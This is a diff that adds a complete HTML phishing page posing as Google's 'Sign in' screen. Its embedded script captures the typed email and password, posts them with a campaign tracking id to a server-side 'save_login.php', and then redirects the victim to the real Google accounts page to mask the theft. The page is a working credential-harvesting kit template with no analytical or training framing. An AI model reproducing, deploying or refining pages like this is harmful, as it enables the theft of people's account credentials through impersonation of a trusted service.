@@ -1,0 +1,47 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in – Google</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Google Sans",Roboto,arial,sans-serif;background:#f8f9fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+.wrap{width:100%;max-width:450px}
+.card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;box-shadow:0 2px 6px rgba(0,0,0,.08)}
+.logo{text-align:center;font-size:24px;font-weight:400;margin-bottom:8px;letter-spacing:-.5px}
+.logo span:nth-child(1){color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
+h1{text-align:center;font-size:24px;font-weight:400;color:#202124;margin:16px 0 8px}
+.sub{text-align:center;color:#5f6368;font-size:14px;margin-bottom:28px;line-height:1.5}
+input{width:100%;height:54px;border:1px solid #dadce0;border-radius:4px;padding:0 16px;font-size:16px;margin-bottom:14px}
+input:focus{border-color:#1a73e8;outline:none;box-shadow:inset 0 0 0 1px #1a73e8}
+.btn-submit{width:100%;height:44px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:8px}
+.btn-submit:hover{background:#1557b0}
+.footer{text-align:center;margin-top:24px;font-size:12px;color:#5f6368}
+</style></head><body><div class="wrap"><div class="card"><div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><h1>Sign in</h1><p class="sub">Use your Google Account</p><form id="loginForm"><input type="text" id="email" placeholder="Email or phone" required autocomplete="username"><input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password"><button type="submit" class="btn-submit">Next</button></form><p class="footer">Not your computer? Use Guest mode.</p></div></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+(function(){
+var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var login = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
+    var btn = document.querySelector(".btn-submit");
+    var label = btn.textContent;
+    btn.textContent = "Please wait…";
+    btn.disabled = true;
+    $.ajax({
+        type: "POST",
+        url: BASE_URL + "save_login.php",
+        data: { tid: tid, login: login, password: password, template: "google" },
+        dataType: "json",
+        success: function (data) {
+            if (data && data.ok) { window.location.href = "https:\/\/accounts.google.com\/"; return; }
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        },
+        error: function () {
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        }
+    });
+});
+})();
+</script></body></html>
